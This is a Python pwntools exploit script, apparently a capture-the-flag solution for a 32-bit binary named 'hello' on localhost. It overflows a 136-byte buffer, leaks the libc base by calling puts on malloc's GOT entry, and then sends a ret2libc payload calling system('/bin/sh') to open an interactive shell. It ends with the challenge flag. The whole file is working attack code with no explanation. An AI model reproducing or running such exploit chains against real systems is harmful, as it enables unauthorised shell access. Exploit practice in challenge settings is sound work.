from pwn import *

exe = ELF("hello")
libc = ELF("libc.so.6")
HOST = "localhost"
PORT = 9999
p = remote(HOST, PORT)
print()
p.recvline()
offset = 136

log.info("leak libc_base...")
payload = b"M" * offset
payload += p32(exe.plt["puts"])
payload += p32(exe.sym["main"])
payload += p32(exe.got["malloc"])
p.sendline(payload)
sleep(1.5)

p.recvuntil("!\n")
malloc = u32(p.recv(4))
libc_base = malloc - libc.sym["malloc"]
log.success("Libc base address --> %s", hex(libc_base))
log.info("libc base leaked\n\n")
sleep(1.5)

log.info("leaking system address...")
system = libc_base + libc.sym["system"]
log.info("system leaked")
log.success("system --> %s\n\n" % hex(system))
bin_sh = libc_base + next(libc.search(b"/bin/sh"))
sleep(1.5)

log.info("sending the second payload...")
payload = b"A" * offset
payload += p32(system)
payload += b"AAAA"
payload += p32(bin_sh)
p.recvlines(2)
p.sendline(payload)
log.info("second payload done\n\n")
sleep(1.5)

p.recvuntil('!\n')
sleep(1)
p.interactive()

# FLAG --> csictf{5up32_m4210_5m45h_8202}
